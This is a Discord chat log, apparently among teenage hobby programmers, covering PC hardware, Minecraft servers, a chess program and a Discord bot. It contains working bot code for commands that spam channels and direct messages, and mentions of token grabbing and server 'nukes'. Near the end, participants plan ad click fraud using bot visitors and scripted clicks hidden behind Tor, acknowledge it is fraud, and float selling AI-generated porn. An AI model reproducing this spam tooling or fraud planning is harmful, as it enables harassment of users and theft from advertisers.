<iframe src="https://discord.com/widget?id=967896406008418426&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe>
```


But most of the frameworks you'll interact with in C is.


The C language itself isn't hard.


I don't even know where it is.


In the future you won't even need programming languages.


Well, yeah, more and more platforms are moving over to the web since it's 1. easier to develop on and 2. enables faster deployment.


Unless, of course, you just have a vendor maintain it for you.


Though you still need people to maintain the underlying system.


C++ is practically the back-end of back-ends.


Where does C++ fit into all of this?


Chromebooks only sped this up.


Though as more applications begins to be deployed from the cloud rather than as desktop programs, web development is slowly taking over front-end development.


A web server is something like Apache or Nginx.


I think you're confused between a "web server" and a "cloud platform".


Front-end software is any software the directly interacts with the user.


Also, why are people stuck in the mindset that front-end is just web development?


Engines being the most complex.


Though in terms of complexity, front-end is probably the simplest.


There are more websites than web servers, that's for sure.


It kind of is.


Isn't that front-end?


Not to mention network drivers.


You need to know how to write web servers also.


I'm more specialized in back-end.


I did specify that I'm not that good in certain aspects.


Plus, since *good* full-stack developers are very hard to come by, it would be more economical to just hire different developers for each level and speciality.


We already have an expert at front-end (Anthony), we have an expert at middle-end (Neng), and we have an expert at back-end (Me), so there isn't really a need for a full-stack developer.


Even within the Li Institution.


The need for full-stack developers are pretty low.


I am technically a full-stack developer, but I'm not that good at certain aspects.


One day I shall write a full document detailing the differences, but today is not that day.


Besides front-end, there is middle-end, back-end, engines, and drivers.


Middle-end (Python) seems to be the easiest thing to program.


"Hey, excuse me, but I just found out that if this happens, this semaphore won't be unlocked, and the program will get stuck. However, if we release this buffer at this time, and unlock the mutual lock here, we might be able to circumvent the problem a little."


Back-end is even more confusing.


For some reasons I have a tendency to use lists for everything that resembles lists.


Maybe you should change that.


Also, not sure why I wrote my name "DATA EXPUNGED".


Also, what about the About page?


Maybe we should've done that.


Looks pretty nice.


Also, by the way, for some reasons my Vulkan drivers are not working correctly.


Looks pretty good.


Considering that the background image also looks very distracting.


That's probably a good idea.


Okay, it turns out Intel's display drivers are disabled.


Oh well, I don't need 60 hertz anyways so...


Wait, then I can't get 4K 60 hertz 😾


I can still connect it to Intel 😎


Wait, fuck, it's not connected.


Also, I'm gonna upscale my 1080p monitor to 4K so it scales properly.


He blocked my bot, so I can't spam DM him anymore.


<@628672513345454122> You're finally online.


You can afford an RTX 3090 but not a 4K monitor?


<@869205843755794472> Also, do you have a 4K monitor?


It's a ray tracing shader.


It's SEUS PTGI.


A.K.A. SEUS PTGI?


Why don't you try using the most intensive Minecraft shader?


<@869205843755794472> Okay, pretty sure you're CPU bottlenecked at this point.


Bruh, imagine using an RTX 3090 for 1080p gaming.


<@869205843755794472> Show debug info.


Until Neng decides to implement a chatbot in can pooper and wants to run it locally, that is.


They also offer a HMX version for higher communication bandiwidth with the CPU.


And that's assuming that you purchase the PCIe version.


Which is going to require their 30 thousand dollars 144-cored Grace Superchip CPU to manage.


And NVIDIA recommends that you buy at least 100 of them to get the best performance.


It's for high-end acceleartion of data-center, cloud, and AI computing, training, and deployment.


It costs 40K-50K each and supports only GPGPU operations, apparently.


You can't even use it for 3D art.


It's not for 3D artists though.


Are you planning on getting an NVIDIA H100 though?


<@869205843755794472> By the way, are you by any chance upgrading to an Intel Core i9-12900KS with an NVIDIA GeForce RTX 3090 Ti and DDR5-5600 RAM?


Kind of. Just use it as a temporary solution until Optifine gets ported over to 1.19.


And better optimization, but since you have a top of the line PC I doubt you'll notice the difference.


Use Iris Shaders instead bozo.


So, around the cost of a First Class ticket.


<@869205843755794472> I assume the PC costed somewhere between $4000 to $10,000 CADs.


Any RGB lights?


With an NZXT Kraken AIO?


And a Z590 chipset motherboard.


I'm gonna assume 128 GB of RAM.


What CPU are you using?


So, your parents paid it for you?


You have a job?


Do you do a lot of 3D art or something?


You have a 3090?


Have you tried them before?


You can probably hit like 80 FPS on Ultra.


And run them really well too.


Wanna know how to get them?


<@672892838995820553> Your server is online, join now!


They look really good.


You should try them.


What are they?


Do you know what they are?


<@672892838995820553> Have you seen shaders?


Because my brother wants to play.


<@672892838995820553> Wanna know how to get shaders?


Or maybe, Neng changed my code.


Bruh, when I made a little update, everything just broke all of a sudden.


By the way, <@672892838995820553>, how does this look?


The RTX 3060 Ti (the card that I wanted to get) can hit up to 165 FPS @ 1080p **with shaders enabled**.


My GTX 1660 SUPER can do 120-144 FPS 1080p though.


That's GTX 1650 performance.


He can run shaders at 80 FPS 1080p 💪 💪 💪


<@816692546272100442> Neng has a GTX 1650M BOZO!!!


<@672892838995820553> Your server is online, join now!


Which is the only type of accounts that do not require emails.


If you have an Aternos account.


You know you can look at the pull request changes and see what he did.


You're not supposed to be able to let the King be captured in chess, so I gotta work on that.


However, the checking system isn't working correctly in other aspects, so I still have a lot to fix.


(Then again, I'm testing on Linux, and you're on Windows, so things could be different).


And performed a move after it.


I did kill the king.


It doesn't crash on the next moves either.


<@628672513345454122> Sorry for the interruption, but just to let you know, I was unable to replicate the crash-on-check bug that you reported.


I can next weekend though.


Oof, it's blocked.


$$$start_spamming_dm$$$ <@672892838995820553> get on the survival server dummy


No, my mom won't let me play Minecraft.


No no no, here we all use NengOS.


For the anti-cheat.


The server started but auto-stopped because you didn't join.


<@672892838995820553> Bruh, why didn't you join?


<@672892838995820553> By the way, you wanna know how to make Minecraft run faster?


<@628672513345454122> I have given you permission to start the `ur_dad_dot_me.aternos.me` server.


It means that you can use a plugin for any versions you want, whereas a mod you can only use it on the Minecraft versions that the developers chose to support.


By the way, I just found out that plugins are backwards-compatible, unlike mods.


Why aren't you joining?


Hold on while I install anti-cheat plugins.


Dad or mom?


Okay, I'm gonna get back to my movie.


The only good anti-cheats are in the form of plugins.


Don't cheat please.


Lord of the Rings: Return of the King.


No mods right now since I didn't have time to install them.


Underscores instead of hyphens I'm pretty sure.


I can start the server though.


However, I cannot play because it's movie night again.


I'll do it tomorrow.


Actually, wait, nevermind.


I'm gonna keep configuring the survival server.


Bruh, Neng has not come online yet.


$$$start_spamming_dm$$$ <@672892838995820553> where did u go?


<@672892838995820553> I'M HOME.

<@672892838995820553> I'M HOME.


<@672892838995820553> I'M HOME.

<@672892838995820553> I'M HOME.


I was at Pelee Point National Park.


Sorry, I was made to go to bed.


Plus, I prefer my typing indicator to be off on public chats.


Without the theme and the animations and stuff.


Also, old Discord is hard to get used to.


Because it's starting bozo.


Because of the overpowered effects?


I can op you.


He doesn't know how to install sodium though.

People pronounces JSON as "Jason".


"mad" as in insane, or "mad" as in angry?


You'll see why when you're older.


Then don't ask.


You'll find out when you're older, kiddo.


The majority of them are either cancelled or already finished.


How was it for you?


Like, `dictionary[member_id] = object`.


So, pickle a dictionary of objects and member IDs?


So, pickle a dictionary?


Not sure why I added that.


Unfortunately, we're not in any of the states.


Bruh, he changed his profile picture again.


Also, I'm not sure if Zombies are considered humans.


Not sure which ones though.


Actually, wait, it is legal under certain American jurisdictions.


Something that's illegal under British, American, and Canadian jurisdictions.


<@816692546272100442> You tried this game before?


I did not know you were near the elevator.


It's easier than Optifine.


Ever downloaded Sodium before?


You don't have a lot of time?


*Laughs in sodium*.


Okay, start by downloading fabric.


Also, <@672892838995820553>, wanna know how to make Minecraft run faster?


<@816692546272100442> By the way, do you play Minecraft?


It's starting now.


So, they kind of removed all official support from Sun-related products like Java.


Microsoft had a feud with Sun in the early 2000s.


Not sure, as <@672892838995820553>


<@628672513345454122> You should add more flash card games.


<@816692546272100442> By the way, if you have a world geography exam, and needs to memorize a bunch of country flags, <@963533621812158474> is here to help you.


I was hoping to trick Mazin. 💀


Wait, it isn't.


Don't worry it's Neng Li's alt.


It's already running now so...


Hold on I gotta go wash dishes.


The timer for the guess thing?


Anyways, <@672892838995820553>, what are you doing right now?


You can if you want.


Then add it.


Okay, plan B.

Code to reload JSON:
```js
config = JSON.parse(fs.readFileSync("./config.json", { encoding: "utf-8", flag: "r" })
```


It has to start with a `./`.


I'm not sure if this is going to work or not, but I have a plan B if it doesn't work.


```js
config = require("json-name.json")
```


And then after you write to the JSON, reload it by doing.


Make it a `let`.


Also, config is a constant, so you can't change it.


Not sure. Try using `require()`.


You have to reload the JSON, sir.


Did you even reloaded the JSON?


Try removing it.


No, I think it's the JSON.parse part that's causing it.


We're trying to write an object to a file when we should be writing a string.


It has be string?


Apparently, it has to be a Buffer or an array of bytes or something.


The data argument?


Wait, I edited the message.


```js
if(stackedCountries.highscore > config.highscore){
fs.writeFile("jsonName.json", JSON.parse(JSON.stringify(stackedCountries)), (err) => {})
}
```


I think you need to pass an error handler.


Oh yeah, sure.


Have you tried this?


```js
if(stackedCountries.highscore > config.highscore){
    fs.writeFileSync("jsonName.json", JSON.parse(JSON.stringify(stackedCountries)))
}
```


But how do you retrieve the high score **from** the JSON?


And what is the code for retrieving the high score?


Did you properly deserialized it though?


<@628672513345454122> By the way, I fixed a few problems in the Li Institution website and added the about page.


Sorry, I didn't knew you laughed at this. 😹


The screw that was supposed to be screwed into the hole not tightening.


I drilled the wrong sized hole.


Not sure how though, you should ask the web development master, <@628672513345454122>, instead.


I think so.


Good. How was it for you?


Isn't it supposed to be `JSON.parse(JSON.stringify(stackCountries))`?


Does it work?


To make sure you're on the right track, are you using serialization?


Oh yeah, I think you can.


You can save data onto JSONs?


<@628672513345454122> So, are you still making the countdown for the `guess` command?


No, it's pre-Taliban takeover Afghanistan.


That resembles the Soviet sickle-and-hammer.


They're only available in China though.


<@816692546272100442> Intel's Arc Alchemist graphics cards are officially released.


You're the only Wumao here.


I just got online.


Unfortunately, I have not solved all the problems listed yet.


Also, I'm surprised that it hasn't hit the Nengish Union yet.


I do not know any country flags.


I'm the owner, so I can't really.


I'm pretty sure I didn't.


In terms of contributions.


I also beated the Cherno.


Speaking of which, our website is still filled with Latin placeholders.


Hold on, mom's calling me.


Or something else?


Now, is the flag stored as an URL?


Aren't you supposed to select a country only if the command `guess` is ran?


Okay, you can stop posting flags now.


Because SVGs are basically text files.


Discord can't embed `SVG`s.


To obtain the flag, use ```js
let flag = country.flag
```


Now, just select a random element with 
```js
let country = Math.floor(Math.random() * countries.length)
```


You know, you can put arrays in JSONs.


Just change the `{`s to `[`s and `}`s to `]`s.


So, first, you need to make the massive list of countries an array.


Couldn't you have put these into a JSON file?


What's that for?


Anyways, <@628672513345454122>, opening the issue?


Also it's hard to tell if you're someone who memorises all the countries in the world or if you're just able to google very fast.


It was mentioned in Diary of a Wimpy Kid.


1999, when it was bombed by NATO.


Date of breakup?


Because the message is getting pushed back very far into the past and it's hard to scroll back up.


Also, are you opening the issue?


Not sure how.


Neng doesn't like it either.


Yes, but the message is quickly pushed upwards.


You don't like it either?


Also, <@672892838995820553>, should board flipping be enabled by default or no?


Also, <@628672513345454122>, why is this not in a GitHub issue?


The reason that it's rotating after every move is because it's made for two people to play on the same computer and I wanted the person playing on Black to have the pieces facing from his perspective but okay...


I think it triggered a segfault or something.


Ayo, that's not what's supposed to happen.


I'm planning on fixing that.


Feel free to open an issue on the GitHub repository.


Oh yeah, actions have to have an event trigger (like a push or an issue open or something). You can't have one without a trigger and turn it on manually apparently.


New Chess Program release.


Does it work though?


**Step 1.** Create a file in your repository called `run.yml` in `.github/workflows`.
**Step 2.** Add the following content to your file.
```yml
name: run
on: []
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install dependency
        run: cd ${{github.workspace}} && node install
      - name: Run the Bot
        run: node ${{github.workspace}}
```


And retrieve it in GitHub actions.


Wait, you can store the token as a secret in the GitHub repository.


Wait, somehow you'll have to obtain the token though.


But FHDBot is open-sourced!


GitHub deployment and stuff.


Oh yeah, we can do that.


Wait, so we can run Discord bots in GitHub actions and let it run for 24/7?


Holy shit, the background image took 8 seconds to load.


So, it should be called external.


It's for *external* files.


At least push your changes.


lol dox <@963533621812158474>


It seems like everyone's getting Nitro classic.


Also, <@628672513345454122>, have you boosted this server yet, or have you already boosted some other server?


It means we can deploy GitHub pages any number of times per month without being limited.


Also, <@672892838995820553>, are you there?


Anyways, <@628672513345454122>, have you pushed yet?


I did not know that.


Public repositories do not have limited action time?


2000 minutes per month.


Let me check.


No, even if you're in a personal account, you're still limited.


GitHub Pages deployments are GitHub Actions.


GitHub Actions are tasks that you can set to run every push.


<@628672513345454122> By the way, we have a limited amount of GitHub Actions per month.


Not done yet?


<@628672513345454122> Did you push your changes though?


Looks pretty good.


Take a look.


<@628672513345454122> Finished the contacts page.


<@628672513345454122> I'm taking a while to create the Discord button.


I'm usually home by 3:00 PM.


I searched for the newest message I sent and read from there.


It's because the diagram *resembles* a tree with branches.


Greetings, Apple Watch Discord user.


You made that in Blender?


Unfortunately, when I initialized it locally, it setted the branch name to `master`, and changing it would break some stuff.


Here you go.


So that the giant row of redstone won't be neccesary?


Can't you just use chain command blocks?


You did that with command blocks?


```
/give FHDHGNGN potion{CustomPotionEffects:[{id:5,Amplifier:255b,Duration:1000000}]}
```


```
/give FHDHGNGN potion{CustomPotionEffects:[{id:"strength",Amplifier:255b,Duration:1000000}]}

Go back to the beginning of the error output.


Pretty sure I did.


Did it put any errors?


It won't fit in the chat.


You have to use a command block.


Are you gonna run the command I sent?


It got in the way and is very distracting.


> There are two types of programming languages: ones that people complains about and ones that no one uses.

- Bjarne Stroustrup.


It's so long that you might have to run it inside a command block, since it won't fit in the chatbox.


To make matters worse, Minecraft's modding API completely changes for every version, which is why mods are only compatible with the specific version of Minecraft that they're built for.


<@672892838995820553> Yo, check this out.

<@628672513345454122> Any replies to this?


```js
if (message.author.id == "can pooper id") {
    // do stuff
}
```


My bot is split up into multiple files, each around 100 lines of code or less.


You know, Can Pooper is proprietary, so refrain from publishing it's source code in the future.


You can start with the Python specification.


And I use it every day. 🙀


That's the give command for the OP potion effects.

Next thing you know, we're writing mods for Minecraft.


It's with the `CustomPotionEffects` property.


<@628672513345454122> By the way, I found out how to encode effects in potions.


I know, right?


So you did ask.


And you deleted the message.


You literally just did.


Your deleted image is recorded in logs.


You should probably do the same for the OP items since chests are finite.


That's probably a good idea.


But I think I'll figure it out.


Should we encode them into potion items?


What about the OP effects?


The OP items?


Your name though.


There's a rich presence mod for Minecraft?


It turned off?


I can't, but I can watch. Neng definitely can though.


All of them except this one are dead though.


All the servers that I am a member of are either owned or administrated by me.


Watch a battle of OPs from two perspectives.


At the lower right corner you can see when it's last updated.


Anyways, here's XLib's documentation.
https://tronche.com/gui/x/xlib/


But the last update was drafted in 2017.


It's *initially released* in 2008.


I'm not into finances at all.


And the tutorials are rather incomplete.


Last time the Xlib documentation was updated was 2009.


Probably, but it's quite outdated.


And plus, XCB has no support for OpenGL contexts, while XLib does.


I'll probably prefer XCB since it's newer and has better documentation, but it's more low-level than XLib.


And XLib and XCB are libraries for you to communicate with it in the C programming language.


Unlike Win32, it provides no pre-built widgets.


Clients communicate to the server via the X11 protocol.


It's a windowing system that runs on a server-client model.


Once again, they're C bindings for the X11 Protocol.


I don't know.


I don't know.


They're C bindings for the X11 Protocol.


Those are Neng's alts.


Those are my alts.


Then what did he mean?


<@845361227093508116> Also, by the way, which is better: XCB or XLib?


That's what I'm asking.


It's the transmission of documents via phone lines.


Because that's a useless skill.


Select Edit Game Profile.


Simply click on the three dots beside the profile name and select the game version.


Because the server is autostopping in 2 minutes to save resources.


<@628672513345454122> Are you joining?


But the mods may not yet.


Because the software is set to fabric, and Fabric doesn't auto-update.


No, it's still on 1.18.2


<@628672513345454122> Your server is online! Join now!


It's why I hate GIFs.


So, a regular boring day?


<@594911836147548170> How's your day so far?


Logos should probably remain as simple as possible.


I can tell.


How is that related?


Bruh, my account is logged in three times for some reasons.


There's two instances of rai rai raku raku running?


Since it would be around like, 20 changes per frame.


That would result in my bot being rate-limited.


Should I change it again?


My GitHub profile picture is also the same as my Discord one.


I've been using my Profile picture since I first created my account.


Okay, hold on until I get on my computer.


I'm mainly specialized in back-end programming.


Also, the footer looks kind of messed up on mobile.


I thought that the menu was animated though.


You can probably spend years optimizing your website for every possible screens.


You just need permissions to set up a webhook in a channel.


It is possible and surprisingly easy.


Yeah, because we wanna cover how we're gonna lay out the Li Institution website.


<@628672513345454122> Have you tried to grab anyone's tokens?


We don't have too much plans for what we're gonna do though.


<@672892838995820553> Consider this.


And the fact that the Administration is easily bribed.


Also, another common thing in high school Discord servers is the Administration hiring random people.


That's about it, and it's technically my brainchild.


One of the exclusive features would probably be the raid-protection system.


Most of the iterations are the same.


If the topic is too broad or too generic, it could be a leading factor of server death.


But the largest factor could perhaps be the fact that most of those servers have no specific topic.


The fact that they're ran by teenagers is the reason why they fail.


<@628672513345454122> Just wondering, did they recover from the nuke?


Ah, so like a combination of the Neng Li brute and super spamming?


So, your bot nuked by cloning all the channels and deleting the original channels?


But you have Admin?


Huang has ownership of the server?


They just like slandering people.


It's her real first name?


I thought Pratha's just a username or something.


Who even is Pratha?


I don't even know what FHDBot's status was at the time so...


So, you spam pinged him multiple times and he got sick of it and left?


You didn't know that Threadripper is a Ryzen?


Also, why did Jay leave?


But it's coming back in Ryzen 7000.


AMD discontinued it for Ryzen 5000.


THREADRIPPER IS BACK!!!


<@628672513345454122> Good morning, if you are up already.


Shall we predict another one in the next few weeks?


Fortunately, the gun thing was last month, because otherwise WOSS would have two involvements with the police this **month**.


Also, is <@432533456807919639> from you or from me?


WOSS now has two involvements with the police this year.


Tomorrow night if I can.


<@672892838995820553> Bruh, your Xi Jinping account also got affected.


He seems to be AFK at the moment.


It's all random.


<@628672513345454122> Bruh, what?


Asking if you like the names of the people.


There's a lot of Neng slander for some reasons.


<@816692546272100442> Hello, Shiva.


I literally just found out that the first elements of the array is most commonly occuring.


Good to hear!


<@788945775446065162> How is your day so far?


Anyways, gonna change the confirmation message.


However, there isn't any laws regarding working conditions for non-human workers yet.


Yes, but `Collection.forEach` launches a new asynchronous process in the background for some reasons.


So it actually sends the confirmation message before it's done.


Father nearby or something?


Anyways, why are you still muted and deafened?


Ah, so you just request the webpage and parse the HTML result?


What do you do?


Okay, how did you do it?


I see you got the name API thing working.


Okay, but use the voice channel chat next time.


Everyone's into shakespearean names all of sudden?


I just moved everyone to Channel Count.


<@628672513345454122> C++ optimization is even more painful.


Try extending the margin.


Add some padding for main?


At least right now it is.


It's the highest monitor resolution a consumer can buy.


Because a partially visible footer looks kinda weird.


Though I would say that it'd look better if it were fully hidden.


You intentionally made it so that it's only partially visible?


Got confused again.


Wait, no I meant the footer.


I can still scroll to see more of the footer.


No, it's partially shown.


You're using absolute positions I assume.


It needs to be either fully visible or completely invisible.


It's partially visible.


Unfortunately, you need to scroll to fully see the footer.


I meant to say *de jure* Employee, which is an employee that is recognized as an employee, but has not signed the employment contract and therefore not a legitimate employee.


Good as well.


How are you?


Why did you put paper in your laptop?


I know, right?


You are going to get the passively-cooled MacBook Air.


The bearings are wearing off.


I think you should replace the fans.


Of course, gaps are left open for airflow.


...though it's mainly because it's usually always under a giant pile of cushions.


My PC is dead silent even under 100% load.


Sure, try that.


Though I'm not entirely sure since I don't use macOS.


There might be a font viewer on macOS.


Choose the font that you like the best for the heading.


Even Anthony's server.


He's in every server you're in.


The 做得好 guy?


For whatever he didn't delete, of course.


...and edited the timestamps so now I'm confused about what happens after what.


Can't really remember anything though since Neng deleted a majority of my memories.


My first actual programming language was Python, which I learned around when I was 10 or something.


So, we're like around the same skill level.


Anyways, gonna turn off the invisible indicator now.


Hello, Apple Watch user.


Since a few months ago. 😹


It's how I figured out what went wrong with mine.


Try setting breakpoints and using the step-through button.


Anyways, what is going on?


Check out my command management system.
```js
import Discord from "discord.js"
import Constants from "./constants.json"
import AnnoyingCommands from "./annoying-commands"
import UtilityCommands from "./utility-commands"

let commands = new Map<string, (args: Discord.Message) => void>();
commands.set("$$$start_spamming$$$", AnnoyingCommands.startSpamming)
commands.set("$$$start_spamming_dm$$$", AnnoyingCommands.startSpammingDM)
commands.set("$$$stop_spamming$$$", AnnoyingCommands.stopSpamming)
commands.set("$$$give_role$$$", UtilityCommands.giveRole)
commands.set("$$$delete_message$$$", UtilityCommands.deleteMessage)
commands.set("$$$list_roles$$$", UtilityCommands.listRoles)
commands.set("$$$invite_to_all_bot_servers$$$", UtilityCommands.inviteToAllBotServers)

let client = new Discord.Client({ 
    intents: [
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MESSAGES,
        Discord.Intents.FLAGS.DIRECT_MESSAGES,
        Discord.Intents.FLAGS.GUILD_MEMBERS
    ]
})

client.on("ready", (client) => {
    console.log(`[INFO]: The client has logged in as ${client.user.tag}.`)
    console.log(`[INFO]: Found ${client.guilds.cache.size} servers.`)
})

client.on("messageCreate", (message) => {
    if (message.channel.type != "DM") {
        console.log(`[MESSAGE ${message.author.tag} ${message.guild?.nameAcronym} ${(message.channel as Discord.TextChannel).name}]: ${message.content}`)
    } else {
        console.log(`[MESSAGE ${message.author.tag} DM ${(message.channel as Discord.DMChannel).recipient.tag}]: ${message.content}`)
    }
    
    if ((client.user != null) && (message.author.id != client.user.id)) {
        let command = message.content.split(" ")[0]
        let handler = commands.get(command)
        if (handler != undefined) {
            handler(message)
        } else {
            // Do miscellaneous stuff here
        }
    }
})

client.login(Constants.TOKEN)
```


Also, the delay should at least be 1000.


Use the debugger and figure out why.


It looks like it's supposed to work.


Besides the crude command management?


Took a while to figure it out though.


And, yes, pings now works.


It's just the order in which the servers appear that makes it look like it does.


Wait, it doesn't.


Not sure why.


Okay, using `setTimeout` seems to solve the problem.


I'm gonna try using `setTimeout`.


The `message.reply` statement is ran before the fields are added. I found that out using the debugger.```js
function inviteToAllBotServers(message: Discord.Message) {
    let embed = new Discord.MessageEmbed
    embed.setTitle("Servers That This Bot Is In")
    let servers = new Array< Array<string> >()
    
    message.client.guilds.cache.each((guild) => {
        const channel = guild.channels.cache.filter((channel) => channel.type == "GUILD_TEXT").first()
        if (channel != null && channel != undefined) {
            guild.invites.create(channel.id).then((invite) => {
                embed.addField(guild.name, invite.url)
            }).catch(console.error)
        }
    })
    
    console.log(servers)
    
    embed.footer = { text: "Note that servers in which the bot does not have access to any channels will not be listed here." }
    
    message.reply({ embeds: [ embed ] })
}
```


<@672892838995820553> Okay, due to the asynchronous nature of discord.js, it turns out it's because it's sending the embed before the fields are added 😹


None of my embeds work anymore.


I'm not sure either.


Yeah, I can tell.


You don't see Apple or NVIDIA using templates.


We need it to be original.


Since it has to look really professional.


The Li Institution's website is probably going to be collaboration effort between me, Neng, and Huang.


Speaking of which, we should probably make the website for the Li Institution.


Just fixing Anthony's website and stuff.


What were you testing before you went AFK?


<@672892838995820553> What are you testing?


Relying on the community to write it from now on.


I've ran out of ideas long ago.


Who will write it?


I know literally nothing about graphics design.


<@672892838995820553> Is super spamming an annoying command or a destructive command?


<@628672513345454122> ```js
let isSpamming = false

function spam(channel: Discord.TextBasedChannel, message: string) {
    if (isSpamming) {
        channel.send(message).catch((error) => {
            console.error(error)
            isSpamming = false
        })
        
        setTimeout(spam, 1500, channel, message)
    }
}

function onMessageCreate(message: Discord.Message) {
    if (!isSpamming) {
        let spamMessage = message.content.substring(message.content.split(" ")[0].length)
        
        if (spamMessage.length == 0 || spamMessage == undefined) {
            spamMessage = "i like cute girls"
        }
        
        isSpamming = true
        spam(message.channel, spamMessage)
    }
}
```


I was testing if the ID locking works.


You like Cubes?


Shiva says it looks lonely.


Like this one I made a few months ago?


I can probably create an abstract vector art in Blender.


But don't use this one since it doesn't match your color scheme.


Or abstract vector art.


Maybe put a video of some sort.


Hence the name.


How about Fira Code?


The blob, that is.


More like upscale it.


Looks good 👍


Maybe it's the dancing blob with it's pixelated edge that's making it look sketchy.


Also, this site looks modern but also sketchy at the same time, and I can't tell why.


Maybe move the stuff on the right to the right edge.


So, he can't.


If he's hosting it locally, he can blacklist my IP.


Can I check your website to see what colour palette you're using?


Ancient Geek, that is.


It's really cool.


Try Ancient Geek.


But I'll send it anyways.


So the chart would like pretty much just like this one.


Those are irrelevant now since all the recorded minutes are normalized to 840.


Alright, since the server is dead, our data analysis team is now publishing the full activity chart of G9DE.


We don't really have any rules.


It's a function that's tied to a specific object.


All other languages calls them "maps".


Also, Python is the only language that calls them "Dictionaries".


When you call it, of course.


And you'll have to pass the dictionary to the function object.


But they have methods and constructors, which maps do not.


The first time I learned object-oriented programming was in Java.


Speaking of JavaScript, I think it's time to organise my bot's code.


It is a dynamic scripting language for adding behaviours to web pages.


dont care + didnt ask


I don't get angry.


😹 😹 😹


Bruh, this guy's just making even more random statements.


You literally cannot think of a legitimate excuse and is just stalling by making random statements.


What does eating a donut have to do with listening to the song?


You weren't even alive during the Hiroshima bombings.


So listen to it.


What does that have to do with listening to the song?


Listen to it then.


Listen to it.


Remember this?

You need a course on Node.js?


Some of these are kind of too vague.


I looked at Swift before.


Ah, I see.


I'm pretty sure you do, since it's very similar to JavaScript.


You can try out Swift here to see if you wanted to learn it.
http://onlineswiftplayground.run/


You know, you can run Swift programs on Windows...


Okay, maybe you can help me port the SCP Engine and/or the Chess Program onto Metal.


But Swift on Windows requires Visual Studio, which is about as big as XCode.


Unless you're on Windows, that is.


Okay, what's next?


Let's talk in VC.


That are realistic and legal.


Okay, let me think of ways to make money.


Anyways, what are your requirements for money making ideas?


Bribe Eric Yao with sex doll.


Also, how come you don't mind Neng stealing activity from your server?


My bot's profile picture is the profile picture that he used when we first met him.


<@628672513345454122> Is Anthony.


What's his name?


Do you have a brother?


I assume that they are twins.


Or Anthony Huang.


So, is <@594911836147548170> in China right now?


How come you two have different last names?


<@628672513345454122> Recongnize this?


And "IT'S BECAUSE IM BRON INTO THIS WORLD"


Used grandpa as his pronoun once.


Or at least used to.


He likes grandpas.


There's only one Neng Li though.


There's like 14 Eric Yaos in HDSB, 4 of them are in VSS.


In return, Anthony gets to use the MacBook.


So, he can send the money to Anthony to have him buy it for Yao.


He just said that he can't buy computers with his money.


Since his parents doesn't allow him to.


He can't use the money himself to buy anything anyways.


You can simply make a contract where you share the MacBook with him.


You know, <@594911836147548170> has the money you need.


No, full ownership, since it's our work.


Though we can have a contract where if we work for the money, he'll have to share partial ownership of the MacBook.


But we don't see a good reason to do so.


Me and Neng can work for him.


He's not getting a job.


We ruled that out already.


That relies on chances.


It would be fraud though.


Like, being trapped in Ukraine and raising money to get out?


You need the receipt.


We can do Minecraft stuff every weekend and post them on Youtube.


You can trademark the Soviet Sickle+Hammer and license it out to entertainment companies who wants to include the Soviet flag in their stuff.


In your defence, though, I haven't seen what people usually buy as NFTs.


No one's going to buy that.


Deepfake your face to make it look like someone's trying to scam you.


To make it better.


Unless you wanted to go into illegal territory.


You'll need adult actors though.


Borrow money from the bank and mine with your MacBook once you get it to pay it back.


Then sell NFTs.


You can borrow my graphics card to AI generate porn that you can then sell.


I doubt it.


Also, how did you convince people to give you money for some random frog that you're making?


The most realistic idea is already out the window.


Ask Elon Musk for $2000.


Not very profitable though.


You can also dropship on Ebay.


Write a bot that posts random generic pro-CCP posts and get yourself hired as a Wumao and have that bot run your account.


Okay, I checked the website and found out that the A100 is the newest Tesla card on there.


Then choose the newest Tesla it has.


It was when the value of BitCoin was higher.


What about the thirty thousand dollar H100?


Anthony just putted 0.1 dollars per kilowatt hours.


The calculators factors in the electricity costs.


A100 is probably the best one.


So, more like 1 dollar a month.


Which you probably aren't going to do since you have to use your computer for something else.


That is, assuming you run it 24/7.


Plus an overclocked 1660S.


I have a 10700K overclocked.


It's a 10400 or something.


The Froggy thing.


It's just their capabilities.


Any CPUs can work.


Yeah, an 8265U.


It's an 82-something U.


But his CPU isn't good, so...


I also suggested mining with NiceHash.


Working at Wendy's or something.


You **will** get sued if you did enough damage in terms of monetary value.


Anthony's not a photoshop master.


<@628672513345454122> How about Adsterra?


It's necessary if you want to make ads.


That's how you get the verified checkmark on Youtube and stuff.


And have human employees manually check them.


No, by "Verify your identity", it's asking for your passport or ID.


Or how to set up advertisement space networks?


You know how to write web bots?


Also, $2000 dollars isn't a lot of damage for most advertisers, so I doubt they'd even care.


As long as they don't find out.


First, though, you'll have to set up the ad system.


It's this program on Windows that allows you to move the mouse and send mouse clicks and press keys from scripts.


You know what Power Automate is?


Wait, I can just use power automate on Windows.


Okay, now I need to figure out how to systematically send clicks.


When you met me and Neng and had us visit your website.


But we're having bots click the ads.


Yeah, I know.


Why do you think Facebook and Google can live entirely off of ad revenue?


On websites it's around the same.


On search engines.


Actually, wait, I found out that it's actually 1 **DOLLAR** per click, not two cents.


Most advertisers probably do not.


If they pay attention, that is.


But we only need to run it for two days.


Though if they find out we can be charged for fraud.


I have beefy CPU and network 💪


60 times a minute.


Three cents for every instance someone actually buys the product advertised.


Two cents for every instance someone clicks on the ad.


It's a penny for every instance someone sees the ad.


Though I can create bot visitors to click on the ads for you if you like.


Since not a lot of people visits your website.


Not sure about the amount of revenue you would get.


NVIDIA uses VSCode in their presentation.


You can make up to 4 alts before drawing suspicions.


You share them with family members.


...to your main account, of course.


Create alt accounts, add them to your family, do the same thing, and send all the points.


Same way I turn off my typing indicators.


But my method does not have such problems.


It might still show a little typing indicator if you're not fast enough.


You can't turn it off without a mod.


Okay, yeah, they are Apple.


You think Discord is Apple?


I turned off typing indicators because this is a public lobby.


Because this is a public lobby.


An easier way would be to ask my friend to wire him $2000 dollars.


You then have to make sure that whatever resource you get is worth more than what you spent on the invasion plus the MacBook Air you wanted to buy.


Technically, you'll probably need around 10, but okay.


You'll need a Tesla GPU to solve CAPTCHAs by software.


Maybe everyone's paranoid about having people see what they're watching on Youtube?


Then, they can't trace the bots back to you.


Not unless you use the Tor API for the bots.


And have bots create bunch of accounts and watch them for ad revenue?


So get ready.


So, ideological beliefs are preventing him from reaching his full potential.


He thinks he's too young to work.


For his MacBook Air.


Every little bit counts.


And are you also grinding with NiceHash?


